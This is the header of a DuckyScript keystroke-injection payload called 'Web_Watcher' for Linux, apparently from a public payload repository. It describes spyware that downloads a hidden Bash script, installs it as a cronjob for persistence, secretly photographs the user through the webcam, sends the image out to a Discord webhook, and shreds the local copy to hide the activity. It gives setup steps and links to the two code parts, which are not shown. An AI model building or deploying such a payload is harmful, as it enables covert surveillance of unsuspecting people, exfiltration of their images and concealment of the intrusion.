REM TITLE: Web_Watcher

REM AUTHOR: OSINTI4L (https://github.com/OSINTI4L)

REM TARGET OS: Linux (tested on Pop!_Os) 

REM DESCRIPTION: Web Watcher is a payload that will download a Bash script (.ww.sh) and embed it as a cronjob. The payload will take a picture of the user via the onboard webcam and then exfiltrate the picture to Discord via webhook. The image will then be shredded locally to obfuscate the activity. The script will run 90 seconds after reboot everytime the target machine is started. To work: place Discord webhook on line 6.

For this payload to work, `fswebcam` must be installed on the target system (`sudo apt install fswebcam`).
The payload contains two parts:

1. [DuckyScript payload.txt](https://github.com/OSINTI4L/DuckyScript-Payloads/blob/main/Payloads/Web_Watcher/payload.txt)
2. [.ww.sh Bash script](https://github.com/OSINTI4L/DuckyScript-Payloads/blob/main/Payloads/Web_Watcher/.ww.sh)
